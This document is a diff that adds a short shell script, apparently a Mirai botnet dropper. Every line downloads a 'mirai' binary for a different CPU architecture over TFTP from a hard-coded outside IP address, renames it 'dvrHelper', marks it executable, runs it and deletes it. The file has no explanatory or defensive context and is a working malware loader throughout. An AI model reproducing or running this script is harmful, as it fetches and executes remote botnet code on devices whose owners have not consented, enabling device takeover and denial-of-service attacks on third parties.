@@ -1,0 +1,11 @@
+#!/bin/sh
+tftp 212.237.33.66 -c get mirai.mpsl;cat mirai.mpsl >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.mips;cat mirai.mips >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.sh4;cat mirai.sh4 >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.x86;cat mirai.x86 >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.arm7;cat mirai.arm7 >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.arm;cat mirai.arm >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.ppc;cat mirai.ppc >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.spc;cat mirai.spc >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.m68k;cat mirai.m68k >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
+tftp 212.237.33.66 -c get mirai.arm5n;cat mirai.arm5n >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrHelper
